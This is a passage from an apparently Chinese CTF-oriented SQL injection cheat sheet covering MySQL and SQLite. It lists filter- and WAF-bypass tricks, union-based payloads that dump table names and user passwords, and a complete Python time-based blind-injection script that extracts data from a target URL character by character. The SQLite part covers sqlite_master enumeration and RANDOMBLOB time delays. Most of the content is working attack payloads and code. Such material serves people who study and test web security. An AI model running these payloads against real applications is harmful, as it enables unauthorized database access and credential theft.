代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</code></pre><p>%a0�</p><p>这个可算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤</p><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>当在登录时使用的是如下SQL语句：</p><pre class="language-none"><code class="language-none">select user from user where user='$_POST[username]' and password='$_POST[password]';</code></pre><p>在这里单引号被过滤了，但是反斜杠<code>\</code>并没有被过滤。则单引号可以被转义</p><p>输入的用户名以反斜杠<code>\</code>结尾</p><pre class="language-none"><code class="language-none">username=admin\&amp;password=123456#将这个拼接进去，\就可以将第2个单引号转义掉select * from users where username='admin\' and password='123456#';这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\' and password=这个整体接下来构造password为or 2&gt;1#select * from users where username='admin\' and password=' or 2&gt;1#';上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//</span><span class="token comment">--%20</span><span class="token comment">/**/</span><span class="token comment">#</span><span class="token comment">--+</span><span class="token comment">-- -</span><span class="token operator">%</span><span class="token number">00</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">00</span><span class="token punctuation">;</span>\x00</code></pre><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p><pre class="language-none"><code class="language-none">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+一些unicode编码举例：    单引号：'%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9</code></pre><h3 id="like绕过"><a href="#like绕过" class="headerlink" title="like绕过"></a>like绕过</h3><pre class="language-none"><code class="language-none">?id=1' or 1 like 1#可以绕过对 = &gt; 等过滤</code></pre><h3 id="in绕过"><a href="#in绕过" class="headerlink" title="in绕过"></a>in绕过</h3><pre class="language-none"><code class="language-none">or '1' IN ('1234')#可以替代=</code></pre><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><pre class="language-sql" data-language="sql"><code class="language-sql">hex<span class="token punctuation">(</span><span class="token punctuation">)</span>、bin<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span>benchmark<span class="token punctuation">(</span><span class="token punctuation">)</span>concat_ws<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span>group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、substr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> substring<span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@user</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@datadir</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&gt;</span> datadir<span class="token punctuation">(</span><span class="token punctuation">)</span>举例：substring<span class="token punctuation">(</span><span class="token punctuation">)</span>和substr<span class="token punctuation">(</span><span class="token punctuation">)</span>无法使用时：?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> pwd <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">74</span>　或者：substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x70</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span></code></pre><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><pre class="language-none"><code class="language-none">select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</code></pre><h3 id="过滤union"><a href="#过滤union" class="headerlink" title="过滤union"></a>过滤union</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union'过滤代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'</code></pre><h3 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where'过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'</code></pre><h3 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit'过滤代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin</code></pre><h3 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by'过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select'过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1只能查询本表中的数据绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'</code></pre><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><h3 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\''过滤代码 1 &amp;&amp; substr(user,1,1) = 'a'绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</code></pre><h3 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h3><pre class="language-sql" data-language="sql"><code class="language-sql">waf <span class="token operator">=</span> <span class="token string">'and|or|union|where|limit|group by|select|\'|hex'</span>过滤代码 <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span>绕过方式 <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#十进制的11转化为十六进制，并小写。</span></code></pre><h3 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h3><pre class="language-sql" data-language="sql"><code class="language-sql">waf <span class="token operator">=</span> <span class="token string">'and|or|union|where|limit|group by|select|\'|hex|substr'</span>过滤代码 <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 绕过方式 <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">in</span> <span class="token string">'r'</span></code></pre><h3 id="过滤-逗号"><a href="#过滤-逗号" class="headerlink" title="过滤,逗号"></a>过滤<code>,</code>逗号</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//过滤了逗号怎么办？就不能多个参数了吗？</span><span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-08-17'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>与<span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-08-17'</span> <span class="token keyword">FROM</span> <span class="token number">6</span> <span class="token keyword">FOR</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>意思相同substr支持这样的语法：SUBSTRING<span class="token punctuation">(</span>str <span class="token keyword">FROM</span> pos <span class="token keyword">FOR</span> len<span class="token punctuation">)</span>SUBSTRING<span class="token punctuation">(</span>str <span class="token keyword">FROM</span> pos<span class="token punctuation">)</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">)</span>后续加入了这种写法</code></pre><h2 id="常用Payload总结"><a href="#常用Payload总结" class="headerlink" title="常用Payload总结"></a>常用Payload总结</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//联合查询</span><span class="token comment">//获取当前数据库的表名</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #//获取表中的字段名1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#</span><span class="token comment">//查询数据</span><span class="token number">1</span><span class="token string">' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #//如果group_concat被过滤了，而又只能返回一条数据，则用limit 0,1//布尔盲注脚本import requests as reqimport time as timport stringurl = "xxx"select = "select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())"select = "select group_concat(column_name) from information_schema.columns where binary table_name in ('</span>xxxx<span class="token string">') "select = "select group_concat(xxxx) from xxxxxxx"res = ""def text2hex(s):    res = ""    for i in s:        res +=hex(ord(i)).replace("0x", "")    return "0x" + resfor i in range(1,50):    for ascii in string.printable:        if ascii == '</span>\\': <span class="token comment">#转义符号没有意义</span>            <span class="token keyword">continue</span>        <span class="token keyword">data</span> <span class="token operator">=</span> {            <span class="token string">"username"</span> : <span class="token string">"admin"</span><span class="token punctuation">,</span>            <span class="token string">"password"</span> : f<span class="token string">"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#"</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>        }        <span class="token keyword">start</span> <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token keyword">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> <span class="token keyword">data</span><span class="token operator">=</span><span class="token keyword">data</span><span class="token punctuation">)</span>        <span class="token keyword">end</span> <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token keyword">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">start</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">end</span> <span class="token operator">&gt;</span> <span class="token number">4</span>:            res <span class="token operator">=</span> ascii <span class="token operator">+</span>res            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> ascii <span class="token operator">=</span><span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span>:<span class="token punctuation">]</span>:            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/**/</span><span class="token comment">--</span>两种注释符 <span class="token comment">--后面不带空格 </span></code></pre><p>可以用于判断数据库类型</p><p><code>#</code>如果不生效的话则说明不是<code>mysql</code></p><h2 id="sqlite系统库"><a href="#sqlite系统库" class="headerlink" title="sqlite系统库"></a>sqlite系统库</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--先创建两个表</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> GIFT<span class="token punctuation">(</span>ID <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ITEM <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LOG <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> SECRET<span class="token punctuation">(</span>ID <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>fl4ggg <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> GIFT <span class="token punctuation">(</span>ID<span class="token punctuation">,</span>ITEM<span class="token punctuation">,</span>LOG<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Turkey"</span><span class="token punctuation">,</span> <span class="token string">"Most British families liketo cook their own turkey. A large number of vegetables and fruits, such asasparagus, celery, onions and chestnuts, are stuffed into the belly of a tenpound turkey, and then coated with a variety of spices before being baked inthe oven."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> SECRET <span class="token punctuation">(</span>id<span class="token punctuation">,</span>fl4ggg<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"flag{Y1ng}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在<code>mysql</code>中查询库名、表名等有系统数据库<code>information_schema</code>，而在<code>sqlite</code>中则是表<code>sqlite_master</code></p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlite<span class="token operator">&gt;</span> <span class="token punctuation">.</span><span class="token keyword">schema</span> sqlite_master<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> sqlite_master <span class="token punctuation">(</span>  <span class="token keyword">type</span> <span class="token keyword">text</span><span class="token punctuation">,</span>  name <span class="token keyword">text</span><span class="token punctuation">,</span>  tbl_name <span class="token keyword">text</span><span class="token punctuation">,</span>  rootpage <span class="token keyword">integer</span><span class="token punctuation">,</span>  <span class="token keyword">sql</span> <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--查询表名</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">SELECT</span> tbl_name <span class="token keyword">FROM</span> sqlite_master <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">'table'</span> <span class="token operator">and</span> tbl_name <span class="token operator">NOT</span> <span class="token operator">like</span> <span class="token string">'sqlite_%'</span><span class="token punctuation">;</span>GIFTSECRET<span class="token comment">--注：这里之所以使用NOT like 'sqlite_%'，是避免出来系统的表，但是可能题目故意将表名弄成sqlite开头</span><span class="token comment">--查询列名</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">SELECT</span> <span class="token keyword">sql</span> <span class="token keyword">FROM</span> sqlite_master <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token operator">!=</span><span class="token string">'meta'</span> <span class="token operator">AND</span> <span class="token keyword">sql</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token operator">AND</span> name <span class="token operator">=</span><span class="token string">'GIFT'</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> GIFT<span class="token punctuation">(</span>ID <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ITEM <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LOG <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">SELECT</span> <span class="token keyword">sql</span> <span class="token keyword">FROM</span> sqlite_master <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token operator">!=</span><span class="token string">'meta'</span> <span class="token operator">AND</span> <span class="token keyword">sql</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token operator">AND</span> name <span class="token operator">=</span><span class="token string">'SECRET'</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> SECRET<span class="token punctuation">(</span>ID <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>fl4ggg <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span></code></pre><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><p>与<code>mysql</code>类似，<code>sqlite</code>中也有字符串截取的函数</p><p><code>substr()、substring()、like、=、&gt;、&lt;、in、between</code>，这些与<code>mysql</code>差不多</p><p>而<code>sqlite</code>特有的</p><p><strong>TRIM</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql">TRIM <span class="token punctuation">(</span>字符串<span class="token punctuation">,</span>要移除的字符<span class="token punctuation">)</span> 如果要移除的字符不写，默认是空格LTRIM 字符串开头部分移除RTRIM 字符串结尾部分移除<span class="token comment">--这个函数与mysql中的TRIM用法不一样</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> trim<span class="token punctuation">(</span><span class="token string">'aaaadsd'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dsdsqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> trim<span class="token punctuation">(</span><span class="token string">'aaaadsda'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dsd可以通过特定的trim构造，实现<span class="token keyword">right</span><span class="token punctuation">(</span><span class="token punctuation">)</span>和<span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">)</span>的功能sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> ltrim<span class="token punctuation">(</span><span class="token string">'casdasd'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">=</span> ltrim<span class="token punctuation">(</span><span class="token string">"casdasd"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token comment">--通过ltrim去除字符与后一个trim判断相等，确定字符</span></code></pre><p><strong>printf(FORMAT,…)</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> printf<span class="token punctuation">(</span><span class="token string">'%.1s'</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>asqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> printf<span class="token punctuation">(</span><span class="token string">'%.2s'</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>aasqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> printf<span class="token punctuation">(</span><span class="token string">'%.3s'</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>aaa<span class="token comment">--通过printf函数格式化操作对字符串截取</span></code></pre><p>通过<code>printf</code>判断长度</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--如果printf('%.is', 'abc')=printf('%.i+1s', 'abc') 则说明字符串长度为i</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> printf<span class="token punctuation">(</span><span class="token string">'%.5s'</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span> <span class="token operator">=</span> printf<span class="token punctuation">(</span><span class="token string">'%.6s'</span><span class="token punctuation">,</span><span class="token string">'aaaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">1</span></code></pre><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><strong>GLOB</strong></p><p>运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回1。与LIKE 运算符不同的是，<strong>GLOB 是大小写敏感的</strong>，对于下面的通配符，它遵循UNIX 的语法。</p><ul><li>星号<code>*</code></li><li>问号<code>?</code></li><li>星号<code>*</code>代表零个、一个或多个数字或字符。问号<code>?</code>代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><p><strong>LIKE</strong></p><p><strong>LIKE</strong> 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，LIKE 运算符将返回真（true），也就是 1。这里有两个通配符与 LIKE 运算符一起使用</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li><li>百分号（%）代表零个、一个或多个数字或字符。下划线（_）代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><code>case when X then Y else Z end</code> 这个语句和<code>mysql</code>是相同的</li><li><code>iif(X,Y,Z)</code></li></ul><p>注意:</p><ol><li><code>sqlite</code>中没有<code>if</code>语句</li><li><code>iif</code>只有<code>version&gt;=3.32</code>可用</li></ol><pre class="language-sql" data-language="sql"><code class="language-sql">sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">end</span><span class="token punctuation">;</span><span class="token number">1</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">end</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token comment">--iif函数使用的版本比较高</span></code></pre><h2 id="构造报错"><a href="#构造报错" class="headerlink" title="构造报错"></a>构造报错</h2><p>在<code>mysql</code>中可以使用<code>exp(999999)</code>报错，但是<code>sqlite</code>中没有</p><p>在<code>sqlite</code>中使用<code>randomblob(N)</code>：返回<code>N-byte blob</code></p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> randomblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> randomblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>�<span class="token punctuation">`</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> randomblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">~</span>��sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> randomblob<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>�<span class="token number">2</span>q�<span class="token comment">--随机返回N个字节的字符</span><span class="token comment">--转化为十六进制看看</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> hex<span class="token punctuation">(</span>randomblob<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>F8896FC0<span class="token comment">--当长度过长时报错</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> randomblob<span class="token punctuation">(</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Error: string <span class="token operator">or</span> <span class="token keyword">blob</span> too big</code></pre><h2 id="时间盲注sql"><a href="#时间盲注sql" class="headerlink" title="时间盲注sql"></a>时间盲注sql</h2><p><code>sqlite</code>中并没有<code>sleep()</code>这样的延时函数，通过<code>like</code>匹配和<code>RANDOMBLOB</code>组合延时</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([秒]00000000/2))))</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token number">123</span><span class="token operator">=</span><span class="token operator">LIKE</span><span class="token punctuation">(</span><span class="token string">'ABCDEFG'</span><span class="token punctuation">,</span>UPPER<span class="token punctuation">(</span>HEX<span class="token punctuation">(</span>RANDOMBLOB<span class="token punctuation">(</span><span class="token number">500000000</span><span class="token operator">/</span><span class="token 